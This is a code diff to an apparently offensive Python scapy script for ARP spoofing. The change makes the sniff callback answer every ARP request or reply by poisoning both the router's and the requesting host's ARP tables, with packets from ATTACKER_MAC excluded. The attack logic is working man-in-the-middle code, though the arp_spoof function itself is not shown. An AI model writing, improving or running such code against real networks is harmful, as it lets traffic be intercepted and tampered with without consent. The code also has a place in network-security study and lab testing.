@@ -132,17 +132,22 @@ def arp_silent():
     while arp_scouting:
         scapy.sniff(prn=arp_scout_callback, store=0, iface=IFACE)
 
+#When an arp request or answer is detected, spoof the arp table, also answer to override it.
 def arp_scout_callback(packet):
     print("debug")
     if packet[scapy.Ether].src == ATTACKER_MAC:
         return
-    if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 1:
-        ip = packet[scapy.ARP].psrc
+    if packet.haslayer(scapy.ARP):
         
-        #wait a bit to overwrite original request
-        time.sleep(0.5)
-        arp_spoof(ip, router_ip)
-        arp_spoof(router_ip, ip)
+        requestor_ip = None
+        if packet[scapy.ARP].op == 1:
+            requestor_ip = packet[scapy.ARP].psrc
+        else :
+            requestor_ip = packet[scapy.ARP].pdst
+
+        arp_spoof(requestor_ip, router_ip)
+        arp_spoof(router_ip, requestor_ip)
+    
     return
 
     
